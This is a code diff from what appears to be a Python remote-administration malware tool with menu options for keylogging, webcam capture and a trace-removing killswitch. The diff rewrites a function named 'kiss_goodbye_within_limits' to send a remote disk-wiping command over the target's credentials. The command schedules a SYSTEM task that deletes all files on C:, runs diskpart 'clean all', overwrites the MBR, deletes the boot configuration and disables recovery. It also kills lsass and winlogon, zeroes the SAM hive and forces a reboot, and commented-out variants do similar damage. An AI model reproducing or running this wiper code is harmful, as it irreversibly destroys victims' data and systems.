@@ -162,12 +162,13 @@ def killSwitch(ipv4,pword,temp_dir,startup_dir):
         execute_killswitch(ipv4,pword,killswitch_command)
         print("[+] Executed killswitch. No Trace left in target host...")
 
-def kiss_goodbye_within_limits(ipv4,pword):
+def kiss_goodbye_within_limits(ipv4,pword,temp_dir): # del /f /s /q C:\*.* | rd C:\ /S /Q 
     print("[*] Preparing to terminate remote target...")
-    #terminator = r"""bcdedit /set {current} safeboot minimal & schtasks /create /tn "DeleteCDrive" /tr "cmd.exe /c rd C:\ /S /Q" /sc onstart /ru SYSTEM /f & shutdown /r /f /t 0"""
-    terminator = r"""takeown /f C:\Windows /r /d y & icacls C:\Windows /grant *S-1-5-32-544:F /t /c /q & reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "winupdate" /t REG_SZ /d "cmd.exe /c rd C:\ /S /Q" /f & bootsect /nt60 C: /force /mbr & del /f /s /q C:\*.* & shutdown /r /f /t 0"""
+    # terminator2_debug_command = r"""schtasks /create /tn "windows xp" /tr "cmd.exe /c del /f /s /q C:\*.* & diskpart /s %temp%\wipe.txt" /sc onstart /ru SYSTEM /f & pause && takeown /f C:\Windows /r /d y & icacls C:\Windows /grant *S-1-5-32-544:F /t /c /q & bcdedit /set {current} recoveryenabled No & bcdedit /set {current} bootstatuspolicy IgnoreAllFailures & bootsect /nt60 C: /force /mbr & bcdedit /delete {current} /f & pause && echo select disk 0 >> %temp%\wipe.txt && echo attributes disk clear readonly >> %temp%\wipe.txt && echo convert mbr >> %temp%\wipe.txt && echo clean all >> %temp%\wipe.txt && pause && taskkill /IM winlogon.exe /F & taskkill /IM explorer.exe /F & taskkill /IM lsass.exe /F & fsutil file setZeroData offset=0 length=1073741824 C:\Windows\System32\config\SAM & pause && del /f /s /q C:\*.* && shutdown /r /f /t 0"""
+    terminator2 = r"""schtasks /create /tn "windows xp" /tr "cmd.exe /c del /f /s /q C:\*.* & diskpart /s %temp%\wipe.txt" /sc onstart /ru SYSTEM /f & pause && takeown /f C:\Windows /r /d y & icacls C:\Windows /grant *S-1-5-32-544:F /t /c /q & bcdedit /set {current} recoveryenabled No & bcdedit /set {current} bootstatuspolicy IgnoreAllFailures & bootsect /nt60 C: /force /mbr & bcdedit /delete {current} /f & pause && echo select disk 0 >> %temp%\wipe.txt && echo attributes disk clear readonly >> %temp%\wipe.txt && echo convert mbr >> %temp%\wipe.txt && echo clean all >> %temp%\wipe.txt && pause && taskkill /IM winlogon.exe /F & taskkill /IM explorer.exe /F & taskkill /IM lsass.exe /F & fsutil file setZeroData offset=0 length=1073741824 C:\Windows\System32\config\SAM & pause && del /f /s /q C:\*.* && shutdown /r /f /t 0"""
+    # terminator = r"""schtasks /create /tn "DestroyWindows" /tr "cmd.exe /c bootsect /nt60 C: /force /mbr & bcdedit /delete {current} /f & bcdedit /set {current} recoveryenabled No & bcdedit /set {current} bootstatuspolicy IgnoreAllFailures & diskpart /s """+temp_dir+r"""/wipe.txt & del /f /s /q C:\*.*" /sc onstart /ru SYSTEM /f & echo select disk 0 >> """+temp_dir+r"""/wipe.txt & echo attributes disk clear readonly >> """+temp_dir+r"""/wipe.txt & echo convert mbr >> """+temp_dir+r"""/wipe.txt & echo clean all >> """+temp_dir+r"""/wipe.txt & shutdown /r /f /t 0"""
     print("[*] Executing...")
-    remote_command(ipv4,pword,terminator)
+    remote_command(ipv4,pword,terminator2)
     print("[+] done...")
 
 def keylogger(ipv4,pword,temp_path,startup_path):
@@ -295,7 +296,7 @@ def cli(arguments):
                 elif option == "10":
                     fetch_camcapture(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
                 elif option == "11":
-                    kiss_goodbye_within_limits(tgt_ipv4,tgt_pword)
+                    kiss_goodbye_within_limits(tgt_ipv4,tgt_pword,tgt_td)
                 elif option in ['x','X']:
                     killSwitch(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option in ["config","c"]:
